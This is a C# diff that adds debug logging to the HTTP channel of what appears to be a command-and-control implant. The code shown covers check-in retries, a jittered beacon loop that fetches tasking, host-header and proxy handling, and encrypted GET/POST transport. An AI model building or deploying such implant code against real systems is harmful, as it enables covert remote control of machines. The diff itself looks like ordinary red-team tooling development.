@@ -76,6 +76,14 @@ namespace Workflow.Channels
 
             this._client = new HttpClient(handler);
 
+            DebugLog.Log("HTTP config loaded");
+            DebugLog.Log($"GET URL: {this.getURL}");
+            DebugLog.Log($"POST URL: {this.postURL}");
+            if (!string.IsNullOrEmpty(this.proxyHost) && this.proxyHost != ":")
+            {
+                DebugLog.Log($"Proxy configured: {this.proxyHost}");
+            }
+
             if (!string.IsNullOrEmpty(this.hostHeader))
             {
                 this._client.DefaultRequestHeaders.Host = this.hostHeader;
@@ -105,15 +113,19 @@ namespace Workflow.Channels
             int currentAttempt = 0;
             do
             {
+                DebugLog.Log($"HTTP checkin attempt {currentAttempt + 1}/{maxAttempts}");
                 string res = await this.Send(JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin));
 
                 if (!string.IsNullOrEmpty(res))
                 {
+                    DebugLog.Log("HTTP checkin succeeded");
                     return JsonSerializer.Deserialize(res, CheckinResponseJsonContext.Default.CheckinResponse);
                 }
+                DebugLog.Log("HTTP checkin attempt failed, empty response");
                 currentAttempt++;
             } while (currentAttempt <= maxAttempts);
 
+            DebugLog.Log("HTTP checkin failed after all attempts");
             return new CheckinResponse()
             {
                 status = "failed"
@@ -126,13 +138,17 @@ namespace Workflow.Channels
             this.cancellationTokenSource = new CancellationTokenSource();
             while (!cancellationTokenSource.Token.IsCancellationRequested)
             {
-                await Task.Delay(Misc.GetSleep(this.agentConfig.sleep, this.agentConfig.jitter) * 1000);
+                int sleepMs = Misc.GetSleep(this.agentConfig.sleep, this.agentConfig.jitter) * 1000;
+                DebugLog.Log($"HTTP beacon sleeping {sleepMs}ms");
+                await Task.Delay(sleepMs);
+                DebugLog.Log("HTTP beacon iteration starting");
                 try
                 {
                     string responseString = await this.Send(messageManager.GetAgentResponseString());
                     if (String.IsNullOrEmpty(responseString))
                     {
                         this.currentAttempt++;
+                        DebugLog.Log($"HTTP beacon empty response, attempt {this.currentAttempt}/{this.maxAttempts}");
                         continue;
                     }
 
@@ -140,10 +156,12 @@ namespace Workflow.Channels
                     if (gtr == null)
                     {
                         this.currentAttempt++;
+                        DebugLog.Log($"HTTP beacon null tasking response, attempt {this.currentAttempt}/{this.maxAttempts}");
                         continue;
                     }
 
                     this.currentAttempt = 0;
+                    DebugLog.Log("HTTP beacon received tasking");
 
                     TaskingReceivedArgs tra = new TaskingReceivedArgs(gtr);
 
@@ -152,10 +170,12 @@ namespace Workflow.Channels
                 catch (Exception e)
                 {
                     this.currentAttempt++;
+                    DebugLog.Log($"HTTP beacon exception, attempt {this.currentAttempt}/{this.maxAttempts}");
                 }
 
                 if (this.currentAttempt >= this.maxAttempts)
                 {
+                    DebugLog.Log("HTTP beacon max attempts reached, cancelling");
                     this.cancellationTokenSource.Cancel();
                 }
             }
@@ -164,12 +184,14 @@ namespace Workflow.Channels
         {
             try
             {
+                DebugLog.Log($"HTTP Send payload ({json.Length} bytes before encryption)");
 
                 //This will encrypted if AES is selected or just Base64 encode if None is referenced.
                 json = this.crypt.Encrypt(json);
 
                 HttpResponseMessage response;
 
+                DebugLog.Log($"HTTP Send via {(json.Length < 2000 ? "GET" : "POST")} ({json.Length} bytes)");
                 if (json.Length < 2000) //Max URL length
                 {
                     // If there are trailing "==" (Base64 padding) at the end of the string, URL-encode them as "%3D%3D"
@@ -187,10 +209,12 @@ namespace Workflow.Channels
                 string strRes = await response.Content.ReadAsStringAsync();
 
                 //This will decrypt and remove the UUID if AES is referenced, or just remove the UUID if None is referenced.
+                DebugLog.Log("HTTP Send succeeded");
                 return this.crypt.Decrypt(strRes);
             }
             catch
             {
+                DebugLog.Log("HTTP Send failed");
                 return String.Empty;
             }
         }
